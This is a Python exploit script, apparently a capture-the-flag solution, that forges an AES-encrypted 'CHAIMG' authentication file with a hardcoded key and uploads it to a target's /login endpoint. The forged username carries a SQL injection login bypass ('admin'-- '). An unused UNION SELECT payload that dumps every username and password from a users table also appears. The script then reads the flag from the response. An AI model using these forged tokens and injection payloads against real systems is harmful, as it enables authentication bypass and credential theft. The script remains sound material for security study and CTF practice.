
# CHAIMG codec: ciphertext-as-key chaining (AES-ECB per block, PKCS#7 padding)
# payload layout:
#   MAGIC(6)="CHAIMG" + CHUNK(4)="AUTH" + ulen(>H) + username + plen(>H) + password
#
# use only on systems/challenges you are authorized to test.

import argparse
import struct
from typing import Optional, Tuple

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

BLOCK_SIZE = 16
MAGIC = b"CHAIMG"
CHUNK = b"AUTH"
import sys
ip = sys.argv[1]

a = print
print = lambda *k, **kw: a(*k, flush=True)

def send_chaimg(file_path, url, session_token=None):
    s = requests.Session()
    headers = {
        "User-Agent": "chaimg-uploader/1.0",
        "Referer": url,
    }
    cookies = {}
    if session_token:
        cookies["sessionToken"] = session_token

    with open(file_path, "rb") as f:
        files = {"chaimg_file": (file_path, f, "application/octet-stream")}
        resp = s.post(
            url,
            files=files,
            headers=headers,
            cookies=cookies,
            allow_redirects=False,
            timeout=20,
        )

    print("Status:", resp.status_code)
    print("Headers:")
    for k, v in resp.headers.items():
        print(f"  {k}: {v}")
    # show response body (short)
    # follow redirect if present and you want to fetch dashboard
    if 300 <= resp.status_code < 400 and "location" in resp.headers:
        follow = resp.headers["location"]
        print("\nServer requested redirect to:", follow)
        try:
            r2 = s.get(
                requests.compat.urljoin(url, follow),
                headers=headers,
                cookies=cookies,
                timeout=20,
            )
            print("Followed redirect status:", r2.status_code)
            print("Follow body (first 800 chars):")
            print(r2.text[r2.text.index('WRECKIT'):])
        except Exception as e:
            print("Error following redirect:", e)


def _ensure16(b: bytes) -> bytes:
    """ensure 16-byte AES key (truncate or pad with zeros)."""
    if len(b) == 16:
        return b
    if len(b) > 16:
        return b[:16]
    return b.ljust(16, b"\x00")


def parse_genesis_key(s: str) -> bytes:
    """accept hex (even length, hex chars) or utf-8 text."""
    s = s.strip()
    try:
        if s and len(s) % 2 == 0 and all(c in "0123456789abcdefABCDEF" for c in s):
            return _ensure16(bytes.fromhex(s))
    except Exception:
        pass
    return _ensure16(s.encode("utf-8"))


# --- chaining AES-ECB ---


def enc_chaimg(genesis_key: bytes, plaintext: bytes) -> bytes:
    """
    Encrypt with ciphertext-as-key chaining:
      key_0 = genesis_key
      for each padded block P_i:
        C_i = AES_ECB(key_{i-1}, P_i)
        key_i = C_i
    """
    key = _ensure16(genesis_key)
    p = pad(plaintext, BLOCK_SIZE)
    out = bytearray()
    for i in range(0, len(p), BLOCK_SIZE):
        block = p[i : i + BLOCK_SIZE]
        ci = AES.new(key, AES.MODE_ECB).encrypt(block)
        out += ci
        key = ci  # next key is this ciphertext block
    return bytes(out)


def dec_chaimg(genesis_key: bytes, ciphertext: bytes) -> bytes:
    """
    Decrypt with ciphertext-as-key chaining:
      key_0 = genesis_key
      for each ciphertext block C_i:
        P_i = AES_ECB_DECRYPT(key_{i-1}, C_i)
        key_i = C_i
    """
    if len(ciphertext) % BLOCK_SIZE != 0:
        raise ValueError("ciphertext length must be multiple of 16")
    key = _ensure16(genesis_key)
    out = bytearray()
    for i in range(0, len(ciphertext), BLOCK_SIZE):
        ci = ciphertext[i : i + BLOCK_SIZE]
        pi = AES.new(key, AES.MODE_ECB).decrypt(ci)
        out += pi
        key = ci
    try:
        return unpad(bytes(out), BLOCK_SIZE)
    except ValueError as e:
        raise ValueError("invalid padding after decryption (wrong key or data).") from e


# --- AUTH payload helpers ---


def build_auth_plain(username: str, password: str) -> bytes:
    u = username.encode("utf-8")
    p = password.encode("utf-8")
    return MAGIC + CHUNK + struct.pack(">H", len(u)) + u + struct.pack(">H", len(p)) + p


def parse_auth_plain(plaintext: bytes) -> Tuple[str, str]:
    off = 0
    if len(plaintext) < 6 + 4 + 2 + 2:
        raise ValueError("plaintext too short")
    if plaintext[off : off + 6] != MAGIC:
        raise ValueError("bad MAGIC")
        off += 6
    off += 6
    if plaintext[off : off + 4] != CHUNK:
        raise ValueError("bad CHUNK")
        off += 4
    off += 4
    if off + 2 > len(plaintext):
        raise ValueError("truncated username length")
    ulen = struct.unpack(">H", plaintext[off : off + 2])[0]
    off += 2
    if off + ulen > len(plaintext):
        raise ValueError("truncated username")
    username = plaintext[off : off + ulen].decode("utf-8", errors="replace")
    off += ulen
    if off + 2 > len(plaintext):
        raise ValueError("truncated password length")
    plen = struct.unpack(">H", plaintext[off : off + 2])[0]
    off += 2
    if off + plen > len(plaintext):
        raise ValueError("truncated password")
    password = plaintext[off : off + plen].decode("utf-8", errors="replace")
    return username, password


# --- CLI ---


def do_encrypt(
    username, password, outfile="forged.chaimg", key="SECRET_GENESIS_K"
) -> None:
    key = parse_genesis_key(key)
    pt = build_auth_plain(
        username,
        password,
    )
    ct = enc_chaimg(key, pt)
    open(outfile, "wb").write(ct)
    print(f"[+] wrote ciphertext to {outfile} (len={len(ct)})")

    send_chaimg(outfile, "http://" + ip + ":11000" + "/login")


def main():
    payload = f"'/**/UNION/**/SELECT/**/group_concat(username||'~'||password,'|:|'),NULL/**/FROM/**/users-- "
    do_encrypt(
        username="admin'-- "  ,
        password="1",
        outfile=f"forged.chaimg",
        key="SECRET_GENESIS_K",
    )
    



if __name__ == "__main__":
    main()